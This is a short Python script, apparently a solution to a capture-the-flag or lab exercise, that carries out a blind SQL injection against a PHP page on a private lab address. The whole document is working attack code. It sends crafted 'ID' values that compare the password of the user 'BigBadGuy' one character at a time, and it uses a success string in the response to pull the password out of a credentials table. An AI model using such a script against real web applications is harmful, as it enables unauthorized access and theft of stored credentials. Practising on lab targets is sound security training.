import requests
import string

# Place here your values
url        = 'http://172.16.238.10/SQLi/SQLi3.php'

# Accumulator 
out = ''

for i in range(0, 40):
    for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + '_' + '{' + '}':
        injection = f"1' AND BINARY((SELECT SUBSTRING(Password,{i},1) FROM SQLi3_Credential WHERE Username='BigBadGuy')) = BINARY('{c}') -- "

        response = requests.get(url, params= {"ID": injection})
        if 'We got you covered' in response.text:
            out += c
            print(out)
            break

print(f'Final out data: {out}')